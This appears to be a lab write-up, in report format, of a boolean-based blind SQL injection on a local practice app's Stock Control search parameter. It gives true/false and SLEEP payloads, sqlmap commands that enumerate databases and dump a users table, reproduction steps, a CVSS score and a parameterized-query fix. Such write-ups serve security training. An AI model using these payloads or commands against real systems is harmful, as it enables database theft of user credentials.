# Boolean-Based Blind SQL Injection

### Vulnerability : Boolean-Based Blind SQL Injection

#### 1. Vulnerability Name & Description

**Challenge Name:** Boolean-Based Blind SQL Injection

**Vulnerability Type:** SQL Injection – Boolean-Based Blind (POST)

The **Stock Control** functionality processes user-supplied input from a POST parameter without proper sanitization or use of parameterized queries.

The application does not display SQL errors directly; instead, it behaves differently based on **true/false SQL conditions**, allowing an attacker to infer database responses.

This vulnerability also supports **time-based payloads**, confirming blind SQL injection and enabling full database enumeration.

***

#### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:**

```
POST <http://localhost:1337/lab/sql-injection/post-blind-boolean/>
```

**Vulnerable Parameter:**

```
search (POST)
```

**Boolean-Based Payload Example:**

```sql
All Products' AND 1=1-- -
```

**False Condition Payload:**

```sql
All Products' AND 1=2-- -
```

**Time-Based Confirmation Payload:**

```sql
All Products' AND SLEEP(5)-- -
```

**Automated Exploitation Command (sqlmap):**

```bash
sqlmap -r ~/ctf/req.txt --batch --dbs
```

**Table Enumeration:**

```bash
sqlmap -r ~/ctf/req.txt --batch -D sql_injection --tables

```

**Dump Users Table:**

```bash
sqlmap -r ~/ctf/req.txt --batch -D sql_injection -Tusers --dump
```

#### Steps to Reproduce:

1. Navigate to the **Stock Control** page
2. Select “All Products” and click **Check**
3. Intercept the POST request using Burp Suite
4. Save the request to a file (`req.txt`)
5. Use sqlmap to confirm Boolean-based blind SQL injection
6. Enumerate databases and tables
7. Dump sensitive user data successfully

***

#### 3. Impact Analysis

* Full database enumeration without visible SQL errors
* Extraction of sensitive user information
* Disclosure of usernames, emails, and passwords
* Authentication bypass possibilities
* Backend database compromise
* Can be chained with privilege escalation or RCE vulnerabilities
* Difficult to detect due to lack of error messages

***

#### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** **8.6 (High)**

**Vector String:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

***

#### 5. Risk Rating / Severity

**Severity Level:** **HIGH**

Boolean-based blind SQL injection is highly dangerous because it allows full database compromise without revealing explicit errors, making detection and prevention difficult.

***

#### 6. Remediation / Mitigation Steps

1. Use **prepared statements / parameterized queries**
2. Never concatenate user input into SQL queries
3. Implement strict input validation on POST parameters
4. Apply least-privilege permissions to database users
5. Disable verbose database behavior
6. Deploy a Web Application Firewall (WAF)

**Secure Example (PHP PDO):**

```php
$stmt =$pdo->prepare("SELECT * FROM products WHERE category = ?");
$stmt->execute([$search]);
```

***

#### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

* Stock Control page with product selection

<figure><img src="../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

* Burp Suite intercepted POST request
* Saved request file `(req.txt)`

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

* sqlmap confirmation of Boolean-based blind SQL injection

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

* Enumerated databases:
* &#x20;`information_schema`
* `mysql`
* `performance_schema`
* `sql_injection`

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

* Dumped users table with credentials
